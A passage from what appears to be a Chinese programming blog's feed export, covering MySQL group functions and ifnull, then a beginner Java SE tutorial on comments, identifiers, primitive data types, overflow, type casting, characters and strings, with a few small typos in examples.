<p>分组函数一共五个，还有另一个名字：多行处理函数。<br>多行处理函数的特点：输入多行，最终输出的结果是一行。</p>
<p>分组函数自动忽略NULL。<br>select count(comm) from emp;</p>
<blockquote>
<p>+————-+<br>| count(comm) |<br>+————-+<br>|           4 |<br>+————-+</p>
</blockquote>
<h1 id="单行处理函数"><a href="#单行处理函数" class="headerlink" title="单行处理函数"></a>单行处理函数</h1><p><strong>输入一行，输出一行</strong></p>
<p>计算每个员工的年薪？<br>select ename, (sal+comm) * 12 as yearsal from emp;<br>重点：所有数据库明文规定只要有NULL参与运算的运算结果一定是NULL</p>
<p><strong>ifnull()</strong>空处理函数？<br>    ifnull(可能为NULL的数据，被当做什么处理)</p>
<p>select ename, (sal+(ifnull(comm,0))) * 12 as yearsal from emp;</p>
<blockquote>
<p>+——–+———-+<br>| ename  | yearsal  |<br>+——–+———-+<br>| SMITH  |  9600.00 |<br>| ALLEN  | 22800.00 |<br>| WARD   | 21000.00 |<br>| JONES  | 35700.00 |<br>| MARTIN | 31800.00 |<br>| BLAKE  | 34200.00 |<br>| CLARK  | 29400.00 |<br>| SCOTT  | 36000.00 |<br>| KING   | 60000.00 |<br>| TURNER | 18000.00 |<br>| ADAMS  | 13200.00 |<br>| JAMES  | 11400.00 |<br>| FORD   | 36000.00 |<br>| MILLER | 15600.00 |<br>+——–+———-+</p>
</blockquote>
<p>题目：找出工资高于平均工资的员工。</p>
<p>select ename, sal from emp where sal &gt; avg(sal);</p>
<p>报错：ERROR 1111 (HY000): Invalid use of group function</p>
<p>select avg(sal) from emp;</p>
<p>+————-+<br>| avg(sal)    |<br>+————-+<br>| 2073.214286 |<br>+————-+</p>
<p>SQL语法当中有一个语法规则，分组函数不可直接使用在where子句当中。</p>
<p> count(*)和count(具体的某个字段)，他们有什么区别？</p>
<p>​    count(*)：不是统计某个字段中数据的个数，而是统计总记录条数</p>
<p>​    count(comm)：表示统计comm字段中不为NULL的数据总数量。</p>
<p>select count(*) from emp;</p>
<p>select count(comm) from emp;</p>
<p> <strong>分组函数也能组合起来用：</strong></p>
<p>mysql&gt; select count(<em>),sum(sal),avg(sal),max(sal),min(sal) from emp;<br>+———-+———-+————-+———-+———-+<br>| count(</em>) | sum(sal) | avg(sal)    | max(sal) | min(sal) |<br>+———-+———-+————-+———-+———-+<br>|       14 | 29025.00 | 2073.214286 |  5000.00 |   800.00 |<br>+———-+———-+————-+———-+———-+</p>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>知识拓展</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVASE</title>
    <url>/posts/18.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="程序注释"><a href="#程序注释" class="headerlink" title="程序注释"></a><strong>程序注释</strong></h1><p>​    任何一套程序代码里面实际上都会由大量的程序逻辑所组成，但是如果要想对一套代码进行长期的维护，就需要编写大量的注释，对一些程序的代码功能要进行详细的解释，这样不仅为自己铺平道路，实际上也为后来接手的工程师铺平道路。</p>
<blockquote>
<p>关于注释的笑话：有一位程序员到一家新的公司进行项目开发，突然有一天老板说，某一个功能执行的速度实在是太慢了，让这位程序员修改一下，后来这个程序员找到了相关源代码，里面写上了一个注释“后面的兄弟，悠着点，我在这里吗让代码延迟了3秒，别一下子改的太快了，给后面的兄弟留点发挥空间”，于是这位工程师根据前辈的注释进行了修改，将原始的延迟3秒，修改为了延迟2.5秒，速度变快了，老板给了奖金。</p>
</blockquote>
<p>​    在Java程序里面针对于代码的注释一共提供了三种注释形式：</p>
<ul>
<li><p>​        单行注释：“// 注释内容”;（考虑到开发工具的代码格式化问题）</p>
</li>
<li><p>​        多行注释：“/*… 注释内容 … */“;</p>
</li>
<li><p>​        文档注释：“/** … 文档注释的特定语法标记进行注释的编写 …… */”，这种注释往往可以结合开发工具使用</p>
</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">public class YootkDemo&#123; &#x2F;&#x2F; 【单行注释】定义程序的执行主类</span><br><span class="line">	public static void main(String args[])&#123;&#x2F;&#x2F; 【单行注释】程序的执行起点，主方法</span><br><span class="line">		&#x2F;*【多行注释】</span><br><span class="line">			以下的程序代码是在屏幕上进行一些提示信息的输出，如果有需要则可以再里面进行多行的定义	</span><br><span class="line">		*&#x2F;</span><br><span class="line">		System.out.println(&quot;Hello world!&quot;); </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>​    既然所有的注释文字不会自己进行代码的编译处理，所以在实际项目开发之中可以将一些暂时不需要的代码通过注释的形式让其失效，这种形式要比直接删除代码更高效。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">public class YootkDemo&#123; &#x2F;&#x2F; 【单行注释】定义程序的执行主类</span><br><span class="line">	public static void main(String args[])&#123;&#x2F;&#x2F; 【单行注释】程序的执行起点，主方法</span><br><span class="line">		&#x2F;*【多行注释】</span><br><span class="line">			以下的程序代码是在屏幕上进行一些提示信息的输出，如果有需要则可以再里面进行多行的定义	</span><br><span class="line">		*&#x2F;</span><br><span class="line">		System.out.println(&quot;Hello world!&quot;); </span><br><span class="line">		&#x2F;&#x2F; 【代码失效】 System.out.println(&quot;江湖上称我为&quot;); </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在以后进行项目开发的时候，一些暂时不需要的代码就可以利用注释进行关闭。</p>
<h1 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h1><p>　　<strong>在任何一个程序里面都一定会有大量的名称进行一些特定结构的声明，例如：在Java程序里面一直强调，每一个程序都是一个类，那么所有的类就一定要有类的名称，这就是属于一个标识符，所有的程序编译器都是依据这个名称来进行代码结构管理的，既然要进行管理，对于名称就有它的命名要求。</strong></p>
<pre><code>在java之中所有的标识符由字母、数字、下划线（_）以及“$”所组成的，其中不能使用数字开头，不能够使用java关键字（保留字）进行标识符定义。
顺便说一下：正常的标识符里面一般都要求有具体的严格意义，例如：你在程序里面定义了a、b、c一系列的标识符，那么这些意义不明确，所以代码
阅读起来是非常困难的。另外对于标识符定义中的“$”也不要去直接使用，因为其有特殊的含义，所以一般来讲标识符的组成就是字母、下划线、数字
所组成的，建议使用字母开头。</code></pre><blockquote>
<p><strong>yootk_name,YootkDemo,teacherLee,num_110</strong>(正确形式)</p>
</blockquote>
<blockquote>
<p><em>110_No.1</em>(使用数字开头、并且使用了“.”作为了标识符的组成)<br><em>abc#hello</em>(使用了非法的“#”符号作为了标识符)<br><em>class</em>(使用了程序中的关键字（保留字），那么这种标识符也是错误的。)</p>
</blockquote>
<p>　　<strong>任何的编程语言里面都会提供有大量的关键字，这些关键字往往都具有特殊的含义，java中的关键字会随着每次版本的更新而有所扩充。</strong></p>
<blockquote>
<p>很多的语言里面都有许多相同的关键字（java、C、++是一个系列的）：for,if,else,swich,while、……；<br>java有两个未使用到的关键字：goto（代码调试的万恶之手）、const(定义常量，被final所取代)；<br>有三个特殊含义的标记（严格来讲不属于关键字）：null、true、false；<br>JDK1.4之后更新了assert关键字，用于断言操作；<br>JDK1.5之后扩充了enum关键字，用于进行枚举定义；<br>JDK1.10之后扩充var关键字，用于进行匹配类型变量的定义；<br>JDK1.13之后扩充yield关键字，进行局部返回。</p>
</blockquote>
<p><em>除了以上的标识符定义要求之外，实际上java也考虑到中国的地位，也推出了一些比较神奇的做法，可以直接使用中文进行标识符的定义。</em></p>
<p><strong>范例：使用中文标识符</strong></p>
<pre><code>    public class 优拓公开课{ // 【单行注释】定义程序的执行主类
    public static void main(String args[]){// 【单行注释】程序的执行起点，主方法
        /*【多行注释】
            以下的程序代码是在屏幕上进行一些提示信息的输出，如果有需要则可以再里面进行多行的定义    
        */
        int 年龄 = 18;//中文定义
        System.out.println(&quot;Hello world!&quot;); 
        // 【代码失效】 System.out.println(&quot;江湖上称我为&quot;); 
    }
}</code></pre><p>​    这种定义的形式可以作为娱乐，但是正常的开发者一般都不会采用这样的形式来进行标识符的定义，还应该使用传统的字母、数字之类的进行定义，除了标识符的组成要求之外，在Java里面或者是在实际的工作之中还会有一些命名规范的出现，命名规范都要求遵循标识符的组成原则，但是对于大小写的定义是有描述的，例如：类名称每个单词的首字母大写（例如：YootkDemo）,这些具体的描述可以根据不同的公司来动态调整。</p>
<h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><h2 id="具体内容"><a href="#具体内容" class="headerlink" title="具体内容"></a>具体内容</h2><p><strong>任何的程序设计语言本身就属于一场数字的游戏，如果说我们的人生就是一部自我完善的坚史，那么编程语言既然是一种现实物理和数学的抽象，其背后就是数字的一场游戏（计算机的组成的核心本质只有数字：“0”、“1”），那么既然要进行数字的操作，则需要进行数据的存储，所以任何的编程语言里面都会设计有一系列的数据类型，利用不同的数据类型保存相应的类型</strong></p>
<p><em>例如：如果要是描述年龄，那么肯定要使用整数。如果要进行折扣处理的话，往往就希望这个小数点越小越好，所以就需要浮点型。所以任何一门完善的编程语言其数据类型的支持程序都是异常丰富的。</em><br>　　<strong>在java程序的内部对于数据类型实际上分为两大类型：</strong></p>
<blockquote>
<p>【分类】基本数据类型：所有的数据操作都是采用值传递，相当于把数据给了对方一个副本信息，副本信息的修改不影响原始的数据内容，这些基本数据类型也是构成程序开发的基本环节；</p>
</blockquote>
<pre><code>|-【子分类】整型：byte、short、int、long;        --&gt;默认值：0
|-【子分类】浮点型（有小数点=小数）：float、double;    --&gt;默认值:0.0
|-【子分类】字符型：char;                --&gt;默认值:&apos;\u0000&apos;(十六进制)
|-【子分类】布尔型：boolean.                --&gt;默认值:false(特殊意义的关键字)</code></pre><p>​    </p>
<blockquote>
<p>【分类】引用数据类型：是进行内存的数据操作，给的内存使用权。是所有初学者最难理解的部分；</p>
</blockquote>
<pre><code>|-有三种引用数据类型：数组、类、接口。            --&gt;默认值:null(特殊意义的关键字)

提示：整个的Java编程语言之中由于对C、C++进行了结构上的优化(Java是基于C++开发出来的),在整个的C、C++里面最让人头疼的部分就是指针，而java为了解决这个问题，取消了指针的定义，而使用了更加简单的引用数据类型来进行代替，在后面进行面向对象讲解开始的时候将对引用数据类型做出全面的分析</code></pre><p>　　<strong>在java开发过程之中，对于基本数据类型（最为核心的数据类型）默认一共提供有八种类型，其中有7种类型是由明确的数据存储范围（计算机里面所有的数据内容都是通过二进制的形式保存的，所有的数据都有一个保存的上限&amp;下限）</strong></p>
<pre><code>-byte: 描述的是字节，在进行网络数据传输一定是字节数据处理，也会用在编码转换上；（1字节）
-int：描述的是整型，例如：定义年龄；（4字节）
-long：描述的是长整型（范围比int广），用在进行文件大小描述、日期时间的描述上；（8个字节）
-double：描述小数，例如：要进行工资的定义，则肯定是小数；（8个字节）
-char：主要是进行中文处理；（2个字节）
-*boolean*：进行逻辑表述。</code></pre><h1 id="变量与常量"><a href="#变量与常量" class="headerlink" title="变量与常量"></a>变量与常量</h1><p>  <strong>变量与常量是在整个程序计算过程之中主要使用的两个数据的存储形式，其中所有给定的不可能修改的内容我们将其称为常量，而所有可以修改的内容就将其称为变量。</strong></p>
<p><em>范例：观察变量</em></p>
<pre><code>public class DongJun{ 
public static void main(String DongJun[]){
    //10是一个数字，既然已经定义好了10，那么就意味着这个内容无法修改了
    System.out.println(10); //常量
}
}</code></pre><blockquote>
<p>程序执行结果:10</p>
</blockquote>
<p><strong>在上学的时候学校经常会用一种方式去惩戒哪些所谓的“调皮的学生”，就是将你的行为和处分决定记录在你的档案里面，这些内容将持续陪伴你，并且不会变更，那么就可以将这些记录定义为你个人的常量</strong><br><em>变量顾名思义就是内容可以改变的标记，所有的变量都一定要有其对应的数据类型，例如:int,double都属于数据类型，每一种变量可以根据其定义的数据类型进行内容的修改。</em></p>
<blockquote>
<p> <strong>如果要想使用变量则必须进行定义，而变量的定义语法形式为：“数据类型 变量名称 = 默认值”，而这个变量名称实际上就是之前讲解的标识符的组成，相当于你自己定义的有意义的名称。</strong></p>
</blockquote>
<p><em>范例：定义变量</em></p>
<pre><code>public class DongJun{ 
public static void main(String DongJun[]){
    //所有程序语言最后一定要使用;作为结尾
    int age = 10;//定义一个整型变量，并且设置了默认值
    System.out.println(age); //输出变量内容
    age = 19; //赋值
    System.out.println(age); //输出变量内容
}
}    </code></pre><blockquote>
<p>程序执行结果： 18<br>       19</p>
</blockquote>
<p><strong>按照正常的设计来讲每一种数据类型即便不设置默认值，那么也应该使用其对应数据类型的默认值进行定义，但是如果你的代码写成如下的形式，则执行的时候一定是错误的</strong></p>
<pre><code>public class DongJun{ 
    public static void main(String DongJun[]){
        int age ;//如果现在没有定义具体的内容，则应该使用默认值“0”来表示
        System.out.println(age);
    }
}</code></pre><blockquote>
<p>D:\yootk&gt;javac DongJun.java<br>DongJun.java:4: 错误: 可能尚未初始化变量age<br>                  System.out.println(age);</p>
</blockquote>
<p><strong>本次主要是观察变量声明和赋值在不同的JDk版本里面所带来的流程上的区别。</strong><br><em>范例：在JDK1.4及以前的版本</em></p>
<blockquote>
<p>要求在主方法中定义变量的同事一定要为其设置默认值，如果不设置就出错；</p>
</blockquote>
<p><em>范例：在JDK1.5及以及以后</em></p>
<blockquote>
<p>在主方法中定义变量的时候可以不设置默认值，但是在其使用之前一定要进行默认值设置，否则会出现编译错误</p>
</blockquote>
<p><strong>如果把常量比喻为不同的咖啡：美式、拿铁、卡布奇诺，这些调制好了的东西一般是不会发生改变的，而如果是变量那么就好比是你的咖啡杯，咖啡杯可以装不同咖啡，但是当你需要更换咖啡的时候，那么就意味着你原始的咖啡就没了，而盛的咖啡就是新的。</strong></p>
<h1 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h1><p><strong>在现实的生活里面数学上一般都会存在有整数的概念，整数实际上描述就是没有小数点的内容，是一个完整的十进制的数值。</strong><br><em>例如：如果要想表示一个人的年龄肯定要使用整数，如果要想去描述住房楼层肯定也使用整数，在Java程序里面，对于整数的数据类型一共有四种支持：Byte、short、int、long。</em><br>　　在给定的这四种整型数据类型里面，最为常用的数据类型就是Int型，在java程序之中任何的一个整型数字的常量默认对应的类型全部都是整型。<br><strong>定义int变量</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        //数据类型 变量名称 = 常量、整数常量的默认类型为 int
        int number = 10; //定义一个整型变量
        // int变量-=  int变量数值 + 20 常量（int类型）
        number = number + 20; // 进行变量的加法计算
        System.out.println(number);
    }
}    </code></pre><blockquote>
<p>程序执行结果：30</p>
</blockquote>
<p><em>虽然int 可以解决大部分的整型的数据操作问题，但是从另外的角度来讲，对于当前程序开发来说，int本身是由其长度范围(-2147483648-2147483647),那么如果说超过了这个计算范围，则就有可能出错。</em></p>
<pre><code>public class DongJun{ 
static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
public static void main(String DongJun[]){
    //数据类型 变量名称 = 常量、整数常量的默认类型为 int
    int max = 2147483647; //定义一个整型变量
    // int变量-=  int变量数值 + 20 常量（int类型）
    max = max + 1; // 进行变量的加法计算
    System.out.println(max);
}
}</code></pre><blockquote>
<p>程序执行结果-2147483648</p>
</blockquote>
<p>这里面就存在了计算机之中的基本概念：二进制的数据计算问题了。在程序之中所有的数据都是被二进制的操作进行管理的，但是由于Java编程语言属于高级编程语言，所以对于一些底层的细节就由编程语言自己来处理。</p>
<pre><code>专业描述：Java之中int数据类型一共有32位，第一位属于符号位，其余的位数属于数据位。每一次进行所谓的加或减的时候实际上都是在底层进行了二进制数据计算，当已经最大值的似乎还“011111”，如果再进行加1的处理，符号位就会发生改变，所以就变为了最小值。</code></pre><p>　　<em>对于以上的问题在程序开发之中可以理解为数据的溢出，数据溢出采用的是一种循环的模式进行处理的。</em></p>
<p><strong>如果要想解决这种数据溢出的问题，那么最佳的做法就是扩大使用的数据范围，比int范围更大的数据范围就是long，所有的编程语言里面对于数据范围的扩大都使用自动的扩大的形式，例如：如果现在是一个int型变量和一个long型变量进行加法操作，那么必定要先进行数据类型的统一，而这种统一的操作过程就是将int类型自动转为long的类型。从而形成最终的两个long型变量的计算操作。</strong><br>范例：通过long数据类型解决int的溢出问题</p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        //数据类型 变量名称 = 常量、整数常量的默认类型为 int
        int max = 2147483647; //定义一个整型变量
        // int变量-=  int变量数值 + 20 常量（int类型）
        System.out.println(max+1L);
    }
}</code></pre><blockquote>
<p>程序执行结果2147483648</p>
</blockquote>
<blockquote>
<p>由于默认的整数对应的类型为int,<em>所以如果要想将其变为long的常量则可以使用“整数L”、“整数l”（“小写L”比较坑）因为其长的和1很相似（如果你没有受过一定的训练是看不出的）</em><br><strong>结论：如果要想解决数据溢出问题，肯定要使用更大的数据类型来进行处理。</strong></p>
</blockquote>
<p>　　<em>这个时候就会出现一个新的概念：数据类型的转换，不同的数据类型之间是可以进行转换的，但是在进行转换的处理过程之中一般都会使用如下的两个转换原则。</em></p>
<blockquote>
<p>自动类型转换：保存数据范围小的数据类型如果遇见了保存范围数据大的数据类型，则范围小的数据类型自动转换为范围大的数据类型后再进行计算，之前的程序就属于这种自动转换。</p>
</blockquote>
<p><em>范例：数据类型的自动转换</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        //数据类型 变量名称 = 常量、整数常量的默认类型为 int
        int num_a = 10 ;
        long num_b = 20;
        //num_a这个int变量由于其数据类型的位数不足，所以将自己转换为long类型后在于num_b进行加法计算
        lonmg result = num_a + num_b;
        System.out.println(result);
    }
}</code></pre><p>​    </p>
<blockquote>
<p>强制类型转换:将保存数据范围大的数据类型强制的变为保存数据范围小的数据类型，这种转换由于需要缩小数据类型的保存位数，所以就有可能产生数据溢出问（数据出错）</p>
</blockquote>
<p><em>范例：数据类型的强制转换</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        //数据类型 变量名称 = 常量、整数常量的默认类型为 int
        //此时必须强制性的将整型常量转为long类型才可以正常保存在long变量之中
        long num = 2147483677L; //该类型已经超过了int的最大内容
        System.out.println(num);
        System.out.println((int)num);
    }
}</code></pre><blockquote>
<p>2147483677<br>-2147483619</p>
</blockquote>
<p><em>*所以这种数据范围的强制转型所带来的最为严重的问题就是有可能会有数据的溢出情况出现，所以如果你非要进行强制性类型转型，那么一定要注意其最终的目标数据类型是否可以包含下当前的数据内容。</em><br>    　　<em>通过以上的分析实际上就可以得到一个最为重要的结论：在进行不同数据类型操作的过程之中，一定会首发发送自动的扩大类型的转型操作，而后再进行计算，但是一般不建议使用强制的类型转换，因为有可能会有数据溢出的问题。</em></p>
<p><strong>既然有了整型的概念，就必须重点分析一下byte数据类型问题</strong></p>
<pre><code>回顾：针对于不同数据类型的使用
    byte：主要用于网络传输、二进制数据处理、编码转换（在讲解IO和网络编程会使用到）
    int：描述大部分的整型数值，以后见到整型的需求首先考虑就是int型变量或常量；
    long：主要描述文件大小或者是日期时间的数字（以后讲解到类库的时候会进行说明）</code></pre><p><em>byte描述的是一个字节，java程序开发之中的每一个字节所能描述的数据范围:”-128-127”，就需要注意其不能够存储更大的数据信息。</em></p>
<p><strong>范例：定义byte变量</strong></p>
<pre><code>public class DongJun{ 
static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
public static void main(String DongJun[]){
    byte data = 10 ; //定义一个byte变量
    System.out.println(data);
}
}</code></pre><blockquote>
<p>10</p>
</blockquote>
<p><strong>以上的程序实现了最为基础的byte变量的定义以及内容的输出，但是在整个的程序执行过程之中会有一个小小的问题出现了：按照之前的概念来讲，此时的数字10应该是一个int型的常量，那么按照以上操作来讲应该是int型的常量赋值给了byte型的变量，出现了一个与之前概念不匹配的应用环境，之所以没有这种强制的转换需求，主要的原因在于：Java针对于符合byte范围内，那么就必须进行强制转换处理。</strong></p>
<p><em>范例：超过byte范围强制处理</em><br>    public class DongJun{<br>        static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示<br>        public static void main(String DongJun[]){<br>            byte data = (byte)250 ; //定义一个byte变量<br>            System.out.println(data);<br>        }<br>    }</p>
<blockquote>
<p>-6</p>
</blockquote>
<p><em>此时由于设置的整型内容超过了byte范围，所以一旦强制性转换之后就产生了数据的溢出问题；</em></p>
<h1 id="浮点型"><a href="#浮点型" class="headerlink" title="浮点型"></a>浮点型</h1><blockquote>
<p><strong>浮点型最大的特点就是在数字里面包含有小数点，在Java程序里面针对于浮点型数据类型提供了两个关键字：</strong></p>
</blockquote>
<pre><code>- 单精度浮点数据类型：float,包含32位的数据长度
- 双精度浮点数据类型：double,包含64位的数据长度
在Java里面，任何的一个小数其默认的数据类型均为double(double可以保存全宇宙里面最大的一个数值)，double是整个是所有数据类型之中可以保存数据内容最大的一种类型。</code></pre><p><em>范例：定义double变量</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        //double 变量 = 常量 (double变量)
        double num_a  = 99.89 ; //定义double变量
        int num_b = 199; 
        //double变量（num_a） + double变量(num_b，int自动转为double) = double结果
        double result = num_a + num_b ; 
        System.out.println(result);
    }
}

&gt;298.89</code></pre><p>　　<strong>java之所以没有使用float作为小数的默认类型，主要是考虑到float计算本身存在的二进制位的操作问题（会产生精度问题），这个问题是整个计算机编程语言行业之中最大的问题（娘胎带的问题了）,所以在java里面如果要想定义float变量，就必须将小数的常量进行强制的类型转换才可以正常进行。</strong></p>
<p><strong>范例：定义float型变量</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        float num_a  = 10.0F ; //将double常量强制转换为float变量
        float num_b  = (float) 0.4; //将double常量强制转换为float变量
        System.out.println(num_a/num_b);</code></pre><p>​<br>​                </p>
<pre><code>    }
}

&gt; 25.0</code></pre><p><em>范例：观察float可能存在的问题</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        float num_a  = 9.9F ; //将double常量强制转换为float变量
        float num_b  = (float) 0.3; //将double常量强制转换为float变量
        System.out.println(num_a/num_b);</code></pre><p>​<br>​            </p>
<pre><code>    }
}</code></pre><blockquote>
<p>32.999996(会出现许多小数)<br>　　<strong>float数据类型本身是有问题的，而正因为这些问题的存在，所以不建议使用float这种数据类型进行浮点数定义，最好使用double。</strong></p>
</blockquote>
<p><em>范例：通过double可以解决float的问题</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        double num_a  = 9.9 ; //将double常量强制转换为float变量
        double num_b  =  0.3; //将double常量强制转换为float变量
        System.out.println(num_a/num_b);</code></pre><p>​<br>​                </p>
<pre><code>    }
}</code></pre><blockquote>
<p>33.0</p>
</blockquote>
<p>　　<em>在以后的项目开发过程之中肯定要首选double作为小数的数据类型。</em></p>
<p><strong>在项目的开发之中整型和浮点型之间最大的区别就是小数点，也就是所有的整型数据内容是不会保留小数位的，那么如果说现在计算的数据本身会产生小数位，则如果没有使用浮点型而使用整型，对应的小数位会全部丢弃。(如果要想准确，那么就必须采用小数来进行计算，需要将其中的一个计算的内容变成double)</strong></p>
<p><em>范例：解决小数点的保留问题</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        int num_a = 9 ;
        int num_b = 2 ; 
        System.out.println(num_a/(double)num_b);

    }
}</code></pre><blockquote>
<p>4.5</p>
</blockquote>
<p><strong>如果在计算之中某一个类型变为了double，则其他的类型都要变为double（double范围是最广的），这个时候当前的计算结果一定是double类型。</strong></p>
<pre><code>通过以上的分析，应该就已经非常清楚了这些数值型的数据类型的自动转换操作过程：byte&gt;short&gt;int&gt;long&gt;float&gt;double(保存范围小的自动进行转换),而在进行强制类型转换的时候，如果浮点型强制变为了整型，那么就会丢掉小数点。</code></pre><blockquote>
<p>在未来选择数值型数字类型的时候，整型就使用int,浮点型（小数）就使用double</p>
</blockquote>
<h1 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h1><p>　　<em>在java程序里面，依然提供有传统编程语言使用的字符的概念，字符是使用“’”声明的一个内容，字符提供有char关键字来进行类型的定义。</em></p>
<p><em>范例：字符的定义</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        char c=  &apos;y&apos;;//字符需要使用单引号进行声明
        System.out.println(c);

    }
}</code></pre><blockquote>
<p>y</p>
</blockquote>
<p><strong>在使用字符进行初始化内容赋值的时候后，一定只能够设置一位内容，如果设置了多位，语法一定会出错。</strong>　</p>
<p>　　<strong>在程序之中字符（char）可以和整型（int）直接进行转化处理，而字符转换为整型之后得到的数值就属于字符的编码。</strong></p>
<blockquote>
<p>　　那么既然所有的字符在JVM里面都有相应的编码存在，这样一来就必须非常清楚几个常见的字符范围的定义：</p>
</blockquote>
<pre><code>小写字符范围（&apos;a&apos;~&apos;z&apos;）:97~122;
大写字符范围（&apos;A&apos;~&apos;Z&apos;）:65~90;
数字字符范围（&apos;0&apos;~&apos;9&apos;）:48~57</code></pre><blockquote>
<p>于是这个时候有人发现一个问题：大写字符和小写字母之间的编码的数值内容差32个，所以理论上修改数值就可以进行大小写的控制，下面市县一个小写字母转大写字母的操作。</p>
</blockquote>
<p><em>范例：小写字母转为大写字母</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        char c=  &apos;a&apos;-32;//字符需要使用单引号进行声明
        System.out.println(c);

    }
}</code></pre><blockquote>
<p>A</p>
</blockquote>
<p><strong>通过以上的分析实际上是许多的读者就应该发现一个比较熟悉的昌吉了，这个场景的内容就是常规的编程语言里面所出现ASCII码的内容（在整个计算机内部核心的组成就是”0”,”1”），但是需要描述的内容太多了，所以就需要对这些数值进行合理的安排，就可以基于不同的内容实现相应字符的显示</strong></p>
<pre><code>需要提醒读者的是，在使用java开发的时候后，所采用的并不是这种ASCII码，JAVA在其设计的时候已经充分的考虑了当前的开发市场（C、C++为主时代）所有的开发者都已经习惯于这样的编码顺序，那么在进行java编码的设计的时候就将传统的ASCII码包含在当前语言设计的编码当中，开发了属于JAVA自己的十六进制编码，该编码的名称为“UNICODE”。UNICODE是一个非常强大的编码，可以描述出世界上任意的文字，包括中文、日文等。</code></pre><p><em>范例：通过char保存中文</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        char c=  &apos;俊&apos;;//传统的ASCII码是不包含中文定义的
        int num = c;
        System.out.println(num);

    }
}</code></pre><blockquote>
<p>20426（这个数值已经远远超过了byte可能描述的数据范围）</p>
</blockquote>
<p>　　<em>UNICODE描述了一个更广阔的编码范围，其中也很好的支持有传统的AsCII编码，让所有的开发者在使用上不会产生任何的不适应感。由于字符可以保存中文，所以在日后进行网络数据传输的时候，如果要进行中文数据的处理，建议使用的就是char来进行操作。</em></p>
<h1 id="布尔型"><a href="#布尔型" class="headerlink" title="布尔型"></a>布尔型</h1><p>　　<em>布尔型是一种描述处理结果的逻辑内容，对于计算机的世界来讲除了真就是假，没有中间的过渡环节，布尔在java编程语言里面使用boolean关键字来进行定义，而布尔的取值只有两个内容：True、False（这两个在java中都属于有特殊含义的关键字）</em></p>
<p><strong>如果要想使用布尔类型进行程序的开发，往往都需要结合一些分支语句的结果进行使用</strong></p>
<p><em>范例：使用布尔型</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        boolean flag = true;
        if(flag){
            System.out.println(&quot;1&quot;);
        }
    }
}</code></pre><p>**　　如果此时设置flag的内容为false，那么对于当前的if判断就不会成立。既然已经谈到布尔数据类型就必须对一个语言的区别进行一些描述。**</p>
<p>　　<em>如果你使用的是C、C++编程开发，在这样的编程语言里面基本上强调都是通过数字0来描述FALSE，而通过一个非0的数字来描述TRUE，通过这样的数值来描述布尔值，但是在JAVA之中并不存在于这样的概念。</em></p>
<h1 id="String-字符串"><a href="#String-字符串" class="headerlink" title="String 字符串"></a>String 字符串</h1><p>　　<strong>在任何一门语言里面实际上字符串都属于一种比较特殊的类型，而JAVA之中字符串也属于非常特殊的一种数据形式，它不是基本数据类型，而它属于一种引用数据类型，因为字符串的类型要使用“String”声明，而在JAVA编写程序代码的过程之中已经明确强调了：首字母大写的一定是类，所以String是一个系统类（这个系统类的设计是非常繁琐的，后面会有专门的内容进行全面分析），本次先来观察一下String的基本使用</strong></p>
<p>　　<em>在程序里面如果要想描述单个字符肯定要使用char类型（通过“’”声明），但是如果要想描述一组的字符，就可以通过字符串的形式来处理。</em></p>
<p><em>范例：定义字符串</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        String message = &quot;董俊&quot;;
        System.out.println(message);

    }
}</code></pre><blockquote>
<p>董俊</p>
